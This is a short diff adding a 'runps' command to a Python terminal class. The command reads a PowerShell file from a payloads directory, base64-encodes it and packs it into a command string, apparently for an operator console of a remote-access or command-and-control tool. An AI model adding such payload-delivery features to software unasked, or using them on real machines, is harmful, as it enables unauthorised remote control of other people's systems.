@@ -9,6 +9,12 @@ class Terminal():
             try:
                 cmd = input()
                 splits = cmd.split(" ")
+                if splits[0] == "runps":
+                    data = open(self.payloadspath + splits[1] + ".ps1","rb").read()
+                    b64 = base64.b64encode(data)
+                    cmd = b"runps " + b64
+                    for each in splits[2:]:
+                        cmd = cmd + b" " + each.encode()
                 if splits[0] == "load":
                     data = b""
                     try:
